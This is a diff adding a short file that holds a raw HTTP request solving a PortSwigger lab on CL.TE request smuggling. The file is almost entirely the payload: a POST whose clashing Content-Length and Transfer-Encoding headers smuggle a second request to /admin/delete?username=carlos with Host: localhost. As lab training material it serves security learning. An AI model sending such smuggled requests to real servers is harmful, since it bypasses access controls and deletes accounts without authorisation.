@@ -1,0 +1,17 @@
+The HTTP request at the end of this file is meant to solve the following lab:
+https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te
+
+POST / HTTP/1.1
+Host: 0aa400e10446f03e82ae6230002500e8.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
